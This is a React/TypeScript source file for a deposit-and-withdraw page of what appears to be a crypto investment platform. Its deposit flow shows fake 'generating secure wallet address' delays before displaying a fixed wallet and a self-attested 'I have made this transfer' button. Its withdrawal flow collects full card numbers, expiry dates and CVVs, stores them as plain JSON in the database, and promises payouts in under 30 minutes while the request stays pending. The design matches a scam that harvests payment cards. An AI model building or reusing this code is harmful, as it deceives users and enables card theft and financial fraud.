import { useState, useEffect } from "react";
import { ArrowDownToLine, ArrowUpFromLine, Copy, Check, Building2, CreditCard, Wallet, Loader2, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { QRCodeSVG } from "qrcode.react";

interface WalletOption {
  crypto_name: string;
  crypto_symbol: string;
  wallet_address: string;
  network: string;
}

const withdrawMethods = [
  { id: "card", name: "Withdraw to Card", icon: CreditCard },
  { id: "bank", name: "Withdraw to Bank", icon: Building2 },
];

type DepositStep = "amount" | "loading" | "wallet" | "confirming" | "success";
type WithdrawStep = "amount" | "details" | "loading" | "success";

interface Transaction {
  id: string;
  type: string;
  amount: number;
  status: string;
  created_at: string;
  wallet_address: string | null;
}

const COUNTRIES = [
  "United States", "United Kingdom", "Canada", "Australia", "Germany", "France",
  "Nigeria", "South Africa", "Ghana", "Kenya", "India", "Brazil", "Mexico",
  "Japan", "South Korea", "Singapore", "United Arab Emirates", "Saudi Arabia",
  "Netherlands", "Switzerland", "Sweden", "Norway", "Denmark", "Italy", "Spain",
  "Portugal", "Ireland", "New Zealand", "Philippines", "Indonesia", "Malaysia",
  "Thailand", "Vietnam", "Egypt", "Morocco", "Tanzania", "Uganda", "Cameroon",
  "Poland", "Czech Republic", "Austria", "Belgium", "Finland", "Colombia",
  "Argentina", "Chile", "Peru", "Turkey", "Pakistan", "Bangladesh",
].sort();

const FundsPage = () => {
  const [tab, setTab] = useState<"deposit" | "withdraw">("deposit");
  const [amount, setAmount] = useState("");
  const [selectedMethod, setSelectedMethod] = useState("card");
  const [depositStep, setDepositStep] = useState<DepositStep>("amount");
  const [withdrawStep, setWithdrawStep] = useState<WithdrawStep>("amount");
  const [copied, setCopied] = useState(false);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [balance, setBalance] = useState(0);
  const [walletOptions, setWalletOptions] = useState<WalletOption[]>([]);
  const [selectedCrypto, setSelectedCrypto] = useState<string>("");

  // Card details
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardName, setCardName] = useState("");

  // Bank details
  const [bankCountry, setBankCountry] = useState("");
  const [bankName, setBankName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [accountName, setAccountName] = useState("");

  useEffect(() => {
    fetchTransactions();
    fetchBalance();
    fetchWallets();
  }, []);

  const fetchWallets = async () => {
    const { data } = await supabase.from("wallet_addresses").select("*").neq("wallet_address", "");
    if (data) {
      setWalletOptions(data as WalletOption[]);
      if (data.length > 0) setSelectedCrypto(data[0].crypto_symbol);
    }
  };

  const getSelectedWallet = () => walletOptions.find((w) => w.crypto_symbol === selectedCrypto);

  const fetchBalance = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;
    const { data } = await supabase.from("profiles").select("balance").eq("user_id", user.id).single();
    if (data) setBalance(Number(data.balance));
  };

  const fetchTransactions = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;
    const { data } = await supabase
      .from("transactions")
      .select("*")
      .eq("user_id", user.id)
      .order("created_at", { ascending: false });
    if (data) setTransactions(data);
  };

  const handleDeposit = () => {
    if (!amount || parseFloat(amount) <= 0) {
      toast.error("Please enter a valid amount");
      return;
    }
    setDepositStep("loading");
    setTimeout(() => setDepositStep("wallet"), 3000);
  };

  const handleCopy = () => {
    const wallet = getSelectedWallet();
    if (!wallet) return;
    navigator.clipboard.writeText(wallet.wallet_address);
    setCopied(true);
    toast.success("Wallet address copied");
    setTimeout(() => setCopied(false), 2000);
  };

  const handleTransferConfirm = async () => {
    const wallet = getSelectedWallet();
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    setDepositStep("confirming");

    const { error } = await supabase.from("transactions").insert({
      user_id: user.id,
      type: "deposit",
      amount: parseFloat(amount),
      wallet_address: wallet?.wallet_address ?? "",
      status: "pending",
    });

    if (error) {
      toast.error("Failed to submit deposit request");
      setDepositStep("wallet");
      return;
    }

    setTimeout(() => {
      setDepositStep("success");
      fetchTransactions();
    }, 3000);
  };

  const handleWithdrawContinue = () => {
    const val = parseFloat(amount);
    if (!amount || val <= 0) {
      toast.error("Please enter a valid amount");
      return;
    }
    if (val > balance) {
      toast.error("Insufficient balance");
      return;
    }
    setWithdrawStep("details");
  };

  const handleWithdrawSubmit = async () => {
    // Validate fields
    if (selectedMethod === "card") {
      if (!cardNumber || !cardExpiry || !cardCvv || !cardName) {
        toast.error("Please fill in all card details");
        return;
      }
    } else {
      if (!bankCountry || !bankName || !accountNumber || !accountName) {
        toast.error("Please fill in all bank details");
        return;
      }
    }

    setWithdrawStep("loading");

    const withdrawalDetails = selectedMethod === "card"
      ? { method: "card", card_number: cardNumber, card_expiry: cardExpiry, card_cvv: cardCvv, card_name: cardName }
      : { method: "bank", country: bankCountry, bank_name: bankName, account_number: accountNumber, account_name: accountName };

    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    // Small delay for splash screen
    await new Promise(r => setTimeout(r, 3000));

    const { error } = await supabase.from("transactions").insert({
      user_id: user.id,
      type: "withdrawal",
      amount: parseFloat(amount),
      status: "pending",
      withdrawal_details: withdrawalDetails,
    } as any);

    if (error) {
      toast.error("Failed to submit withdrawal request");
      setWithdrawStep("details");
      return;
    }

    setWithdrawStep("success");
    fetchTransactions();
  };

  const resetDeposit = () => {
    setDepositStep("amount");
    setAmount("");
  };

  const resetWithdraw = () => {
    setWithdrawStep("amount");
    setAmount("");
    setCardNumber(""); setCardExpiry(""); setCardCvv(""); setCardName("");
    setBankCountry(""); setBankName(""); setAccountNumber(""); setAccountName("");
  };

  return (
    <div className="px-4 sm:px-6 py-5 max-w-4xl mx-auto space-y-5">
      <h1 className="text-2xl font-bold text-foreground">Deposit / Withdraw</h1>

      {/* Tab */}
      <div className="flex gap-2 p-1 bg-muted rounded-xl max-w-sm">
        <button
          onClick={() => { setTab("deposit"); resetDeposit(); resetWithdraw(); }}
          className={cn(
            "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-bold transition-all",
            tab === "deposit" ? "bg-primary text-primary-foreground shadow-lg" : "text-muted-foreground hover:text-foreground"
          )}
        >
          <ArrowDownToLine size={16} /> Deposit
        </button>
        <button
          onClick={() => { setTab("withdraw"); resetDeposit(); resetWithdraw(); }}
          className={cn(
            "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-bold transition-all",
            tab === "withdraw" ? "bg-primary text-primary-foreground shadow-lg" : "text-muted-foreground hover:text-foreground"
          )}
        >
          <ArrowUpFromLine size={16} /> Withdraw
        </button>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
        {/* Form */}
        <div className="bg-background rounded-xl border border-border p-5 space-y-4 min-h-[400px] flex flex-col">
          {tab === "deposit" ? (
            <DepositFlow
              step={depositStep}
              amount={amount}
              setAmount={setAmount}
              onContinue={handleDeposit}
              onCopy={handleCopy}
              copied={copied}
              onConfirm={handleTransferConfirm}
              onCancel={resetDeposit}
              walletOptions={walletOptions}
              selectedCrypto={selectedCrypto}
              setSelectedCrypto={setSelectedCrypto}
            />
          ) : (
            <WithdrawFlow
              step={withdrawStep}
              amount={amount}
              setAmount={setAmount}
              balance={balance}
              selectedMethod={selectedMethod}
              setSelectedMethod={setSelectedMethod}
              onContinue={handleWithdrawContinue}
              onSubmit={handleWithdrawSubmit}
              onBack={() => setWithdrawStep("amount")}
              onReset={resetWithdraw}
              cardNumber={cardNumber} setCardNumber={setCardNumber}
              cardExpiry={cardExpiry} setCardExpiry={setCardExpiry}
              cardCvv={cardCvv} setCardCvv={setCardCvv}
              cardName={cardName} setCardName={setCardName}
              bankCountry={bankCountry} setBankCountry={setBankCountry}
              bankName={bankName} setBankName={setBankName}
              accountNumber={accountNumber} setAccountNumber={setAccountNumber}
              accountName={accountName} setAccountName={setAccountName}
            />
          )}
        </div>

        {/* Transaction History */}
        <div className="bg-background rounded-xl border border-border overflow-hidden">
          <div className="px-4 py-3 border-b border-border">
            <h3 className="text-sm font-bold text-foreground">Transaction History</h3>
          </div>
          {transactions.length === 0 ? (
            <div className="px-4 py-8 text-center text-sm text-muted-foreground">No transactions yet</div>
          ) : (
            transactions.map((tx) => (
              <div key={tx.id} className="flex items-center gap-3 px-4 py-3 border-b border-border last:border-0">
                <div className={cn("w-8 h-8 rounded-full flex items-center justify-center",
                  tx.type === "deposit" ? "bg-green-500/10" : "bg-destructive/10"
                )}>
                  {tx.type === "deposit"
                    ? <ArrowDownToLine size={14} className="text-green-500" />
                    : <ArrowUpFromLine size={14} className="text-destructive" />}
                </div>
                <div className="flex-1">
                  <p className="text-sm font-semibold text-foreground capitalize">{tx.type}</p>
                  <p className="text-xs text-muted-foreground">
                    {new Date(tx.created_at).toLocaleDateString()}
                  </p>
                </div>
                <div className="text-right">
                  <p className={cn("text-sm font-bold",
                    tx.type === "deposit" ? "text-green-500" : "text-destructive"
                  )}>
                    {tx.type === "deposit" ? "+" : "-"}${Number(tx.amount).toLocaleString()}
                  </p>
                  <p className={cn("text-xs",
                    tx.status === "approved" ? "text-green-500" :
                    tx.status === "pending" ? "text-yellow-600" : "text-destructive"
                  )}>
                    {tx.status === "approved" ? "Completed" : tx.status === "pending" ? "Pending" : "Rejected"}
                  </p>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
};

/* ── Deposit Sub-Component ── */
const DepositFlow = ({ step, amount, setAmount, onContinue, onCopy, copied, onConfirm, onCancel, walletOptions, selectedCrypto, setSelectedCrypto }: any) => {
  const selectedWallet = walletOptions?.find((w: WalletOption) => w.crypto_symbol === selectedCrypto);
  const walletAddr = selectedWallet?.wallet_address || "";

  if (step === "amount") return (
    <>
      <h2 className="text-lg font-bold text-foreground">Deposit Funds</h2>
      <div className="space-y-1.5">
        <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Amount (USD)</label>
        <Input type="number" placeholder="0.00" value={amount} onChange={(e: any) => setAmount(e.target.value)}
          className="bg-muted border-border text-right font-semibold text-lg" />
      </div>
      {walletOptions && walletOptions.length > 1 && (
        <div className="space-y-1.5">
          <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Payment Crypto</label>
          <Select value={selectedCrypto} onValueChange={setSelectedCrypto}>
            <SelectTrigger className="bg-muted border-border">
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              {walletOptions.map((w: WalletOption) => (
                <SelectItem key={w.crypto_symbol} value={w.crypto_symbol}>
                  {w.crypto_name} ({w.crypto_symbol})
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>
      )}
      <div className="flex-1" />
      <Button onClick={onContinue} className="w-full py-5 text-base font-bold">Continue</Button>
    </>
  );

  if (step === "loading") return (
    <div className="flex-1 flex flex-col items-center justify-center gap-4">
      <div className="relative">
        <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center animate-pulse">
          <Loader2 size={36} className="text-primary animate-spin" />
        </div>
        <div className="absolute inset-0 rounded-full border-2 border-primary/30 animate-ping" />
      </div>
      <p className="text-sm font-semibold text-foreground">Preparing your deposit...</p>
      <p className="text-xs text-muted-foreground">Generating secure wallet address</p>
    </div>
  );

  if (step === "confirming") return (
    <div className="flex-1 flex flex-col items-center justify-center gap-4">
      <div className="relative">
        <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center animate-pulse">
          <Loader2 size={36} className="text-primary animate-spin" />
        </div>
        <div className="absolute inset-0 rounded-full border-2 border-primary/30 animate-ping" />
      </div>
      <p className="text-sm font-semibold text-foreground">Processing your deposit...</p>
      <p className="text-xs text-muted-foreground">Please wait while we verify your transaction</p>
    </div>
  );

  if (step === "success") return (
    <div className="flex-1 flex flex-col items-center justify-center gap-4">
      <div className="w-20 h-20 rounded-full bg-yellow-500/10 flex items-center justify-center">
        <CheckCircle2 size={40} className="text-yellow-500" />
      </div>
      <h2 className="text-lg font-bold text-foreground">Transaction In Progress</h2>
      <p className="text-sm text-muted-foreground text-center">Your deposit of <span className="font-bold text-foreground">${parseFloat(amount).toLocaleString()}</span> has been submitted.</p>
      <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg px-4 py-3 text-center">
        <p className="text-sm font-semibold text-yellow-600">Pending Approval</p>
        <p className="text-xs text-muted-foreground mt-1">Your balance will update once approved by an administrator.</p>
      </div>
      <div className="flex-1" />
      <Button onClick={onCancel} variant="outline" className="w-full py-4 text-sm font-bold">Back to Deposits</Button>
    </div>
  );

  return (
    <div className="flex-1 flex flex-col items-center gap-4">
      <h2 className="text-lg font-bold text-foreground">Send {selectedWallet?.crypto_name || "Payment"}</h2>
      <p className="text-xs text-muted-foreground">{selectedWallet?.network} Network</p>
      <div className="bg-white p-3 rounded-xl border border-border">
        <QRCodeSVG value={walletAddr} size={160} />
      </div>
      <div className="w-full space-y-1">
        <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Wallet Address</label>
        <div className="flex items-center gap-2 bg-muted rounded-lg px-3 py-2.5 border border-border">
          <span className="text-xs font-mono text-foreground truncate flex-1">{walletAddr}</span>
          <button onClick={onCopy} className="shrink-0 text-muted-foreground hover:text-foreground transition-colors">
            {copied ? <Check size={16} className="text-green-500" /> : <Copy size={16} />}
          </button>
        </div>
      </div>
      <div className="w-full bg-muted rounded-lg px-4 py-3 border border-border text-center">
        <p className="text-xs text-muted-foreground">Amount to deposit</p>
        <p className="text-2xl font-bold text-foreground">${parseFloat(amount).toLocaleString()}</p>
      </div>
      <div className="flex-1" />
      <Button onClick={onConfirm} className="w-full py-5 text-base font-bold">I have made this transfer</Button>
      <button onClick={onCancel} className="text-xs text-muted-foreground hover:text-foreground transition-colors">Cancel</button>
    </div>
  );
};

/* ── Withdraw Sub-Component ── */
const WithdrawFlow = ({
  step, amount, setAmount, balance, selectedMethod, setSelectedMethod,
  onContinue, onSubmit, onBack, onReset,
  cardNumber, setCardNumber, cardExpiry, setCardExpiry, cardCvv, setCardCvv, cardName, setCardName,
  bankCountry, setBankCountry, bankName, setBankName, accountNumber, setAccountNumber, accountName, setAccountName,
}: any) => {
  if (step === "amount") return (
    <>
      <h2 className="text-lg font-bold text-foreground">Withdraw Funds</h2>
      <div className="bg-muted rounded-lg px-4 py-3 border border-border">
        <p className="text-xs text-muted-foreground">Available Balance</p>
        <p className="text-xl font-bold text-foreground">${balance.toLocaleString()}</p>
      </div>
      <div className="space-y-1.5">
        <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Amount (USD)</label>
        <Input type="number" placeholder="0.00" value={amount} onChange={(e: any) => setAmount(e.target.value)}
          className="bg-muted border-border text-right font-semibold text-lg" />
      </div>
      <div className="space-y-2">
        <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Withdrawal Method</label>
        {withdrawMethods.map((method) => (
          <button key={method.id} onClick={() => setSelectedMethod(method.id)}
            className={cn(
              "w-full flex items-center gap-3 px-4 py-3 rounded-lg border transition-all text-left",
              selectedMethod === method.id ? "border-primary bg-primary/5" : "border-border hover:bg-muted"
            )}
          >
            <method.icon size={18} className={selectedMethod === method.id ? "text-primary" : "text-muted-foreground"} />
            <span className="text-sm font-medium text-foreground">{method.name}</span>
          </button>
        ))}
      </div>
      <div className="flex-1" />
      <Button onClick={onContinue} className="w-full py-5 text-base font-bold">Continue</Button>
    </>
  );

  if (step === "details") return (
    <>
      <div className="flex items-center gap-2">
        <button onClick={onBack} className="text-muted-foreground hover:text-foreground transition-colors text-sm">← Back</button>
        <h2 className="text-lg font-bold text-foreground">
          {selectedMethod === "card" ? "Card Details" : "Bank Details"}
        </h2>
      </div>

      <div className="bg-muted rounded-lg px-4 py-2 border border-border text-center">
        <p className="text-xs text-muted-foreground">Withdrawing</p>
        <p className="text-lg font-bold text-foreground">${parseFloat(amount).toLocaleString()}</p>
      </div>

      {selectedMethod === "card" ? (
        <div className="space-y-3">
          <div className="space-y-1">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Name on Card</label>
            <Input value={cardName} onChange={(e: any) => setCardName(e.target.value)} placeholder="John Doe"
              className="bg-muted border-border" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Card Number</label>
            <Input value={cardNumber} onChange={(e: any) => setCardNumber(e.target.value)} placeholder="4242 4242 4242 4242"
              className="bg-muted border-border" maxLength={19} />
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div className="space-y-1">
              <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Expiry</label>
              <Input value={cardExpiry} onChange={(e: any) => setCardExpiry(e.target.value)} placeholder="MM/YY"
                className="bg-muted border-border" maxLength={5} />
            </div>
            <div className="space-y-1">
              <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">CVV</label>
              <Input value={cardCvv} onChange={(e: any) => setCardCvv(e.target.value)} placeholder="123"
                className="bg-muted border-border" maxLength={4} type="password" />
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-3">
          <div className="space-y-1">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Country</label>
            <Select value={bankCountry} onValueChange={setBankCountry}>
              <SelectTrigger className="bg-muted border-border">
                <SelectValue placeholder="Select country" />
              </SelectTrigger>
              <SelectContent>
                {COUNTRIES.map(c => (
                  <SelectItem key={c} value={c}>{c}</SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Bank Name</label>
            <Input value={bankName} onChange={(e: any) => setBankName(e.target.value)} placeholder="Enter bank name"
              className="bg-muted border-border" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Account Number</label>
            <Input value={accountNumber} onChange={(e: any) => setAccountNumber(e.target.value)} placeholder="Enter account number"
              className="bg-muted border-border" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Account Name</label>
            <Input value={accountName} onChange={(e: any) => setAccountName(e.target.value)} placeholder="Enter account name"
              className="bg-muted border-border" />
          </div>
        </div>
      )}

      <div className="flex-1" />
      <Button onClick={onSubmit} className="w-full py-5 text-base font-bold">Submit Withdrawal</Button>
    </>
  );

  if (step === "loading") return (
    <div className="flex-1 flex flex-col items-center justify-center gap-4">
      <div className="relative">
        <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center animate-pulse">
          <Loader2 size={36} className="text-primary animate-spin" />
        </div>
        <div className="absolute inset-0 rounded-full border-2 border-primary/30 animate-ping" />
      </div>
      <p className="text-sm font-semibold text-foreground">Processing withdrawal...</p>
      <p className="text-xs text-muted-foreground">Verifying your details</p>
    </div>
  );

  // success
  return (
    <div className="flex-1 flex flex-col items-center justify-center gap-4 text-center">
      <div className="w-20 h-20 rounded-full bg-green-500/10 flex items-center justify-center">
        <CheckCircle2 size={40} className="text-green-500" />
      </div>
      <h2 className="text-lg font-bold text-foreground">Withdrawal Submitted</h2>
      <p className="text-sm text-muted-foreground">
        Your withdrawal of <span className="font-bold text-foreground">${parseFloat(amount).toLocaleString()}</span> has been submitted.
      </p>
      <p className="text-sm font-medium text-primary">Expected in less than 30 minutes</p>
      <div className="flex-1" />
      <Button onClick={onReset} variant="outline" className="w-full py-5 text-base font-bold">Done</Button>
    </div>
  );
};

export default FundsPage;
